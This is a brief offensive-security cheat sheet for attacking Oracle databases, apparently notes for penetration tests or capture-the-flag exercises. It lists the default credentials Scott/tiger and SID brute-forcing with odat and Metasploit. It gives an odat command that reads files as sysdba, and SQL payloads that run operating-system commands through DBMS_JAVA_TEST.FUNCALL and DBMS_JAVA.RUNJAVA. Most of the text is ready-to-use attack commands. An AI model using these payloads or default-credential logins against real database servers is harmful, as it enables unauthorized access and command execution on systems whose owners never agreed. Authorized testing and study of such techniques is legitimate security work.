# Oracle / ODAT

# Basic Credentials
``` 
Username --> Scott 
Password --> tiger
```

# Brute-force SID  
- **[HELP](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)**       
1. Use: `odat` and its `sidguesser` to bruteforce with a link provided
2. Use metasploit and use `auxiliary(admin/oracle/sid_brute)`
3. Use `sqlplus` to login with the creds or
    1. Read file with odat:    
    ```sh
    odat ctxsys -s <ip> -d XE -U SCOTT -P tiger --sysdba --getFile flag.txt
    ```

# Command Execution
```sql
-- 10g R2, 11g R1 and R2: DBMS_JAVA_TEST.FUNCALL()
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual

-- 11g R1 and R2: DBMS_JAVA.RUNJAVA()
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
```

# References
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)